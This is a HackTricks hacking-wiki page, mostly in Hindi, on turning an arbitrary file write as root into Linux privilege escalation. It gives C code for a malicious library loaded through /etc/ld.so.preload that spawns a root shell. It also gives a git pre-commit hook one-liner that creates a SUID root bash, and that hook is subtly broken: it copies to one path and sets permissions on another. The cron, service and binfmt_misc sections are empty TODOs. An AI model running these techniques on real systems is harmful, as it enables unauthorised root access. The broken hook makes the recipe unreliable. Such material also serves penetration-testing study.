# रूट पर मनमाने फ़ाइल लेखन

{% hint style="success" %}
AWS हैकिंग सीखें और अभ्यास करें:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP हैकिंग सीखें और अभ्यास करें: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks का समर्थन करें</summary>

* [**सदस्यता योजनाएँ**](https://github.com/sponsors/carlospolop) देखें!
* **हमारे** 💬 [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) में शामिल हों या **हमें** **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** पर फ़ॉलो करें।**
* **हैकिंग ट्रिक्स साझा करें और** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) गिटहब रिपोजिटरी में PRs सबमिट करें।

</details>
{% endhint %}

### /etc/ld.so.preload

यह फ़ाइल **`LD_PRELOAD`** पर्यावरण चर की तरह व्यवहार करती है लेकिन यह **SUID बाइनरीज़** में भी काम करती है।\
यदि आप इसे बना सकते हैं या संशोधित कर सकते हैं, तो आप बस एक **पथ जोड़ सकते हैं जो एक लाइब्रेरी का होगा** जिसे प्रत्येक निष्पादित बाइनरी के साथ लोड किया जाएगा।

उदाहरण: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) वे **स्क्रिप्ट** हैं जो एक git रिपॉजिटरी में विभिन्न **घटनाओं** पर **चलती** हैं जैसे कि जब एक कमिट बनाया जाता है, एक मर्ज... तो यदि एक **विशिष्ट स्क्रिप्ट या उपयोगकर्ता** ये क्रियाएँ बार-बार कर रहा है और यह संभव है कि **`.git` फ़ोल्डर** में **लिखा जाए**, तो इसका उपयोग **privesc** के लिए किया जा सकता है।

उदाहरण के लिए, यह संभव है कि एक git रिपॉजिटरी में **`.git/hooks`** में एक **स्क्रिप्ट** उत्पन्न की जाए ताकि यह हमेशा नए कमिट के बनने पर चल सके:

{% code overflow="wrap" %}
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
{% endcode %}

### Cron & Time files

TODO

### Service & Socket files

TODO

### binfmt\_misc

फाइल `/proc/sys/fs/binfmt_misc` में स्थित है जो यह दर्शाती है कि कौन सा बाइनरी किस प्रकार की फाइलों को निष्पादित करना चाहिए। TODO: एक सामान्य फाइल प्रकार खुलने पर रिवर्स शेल निष्पादित करने के लिए इसका दुरुपयोग करने की आवश्यकताओं की जांच करें।

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
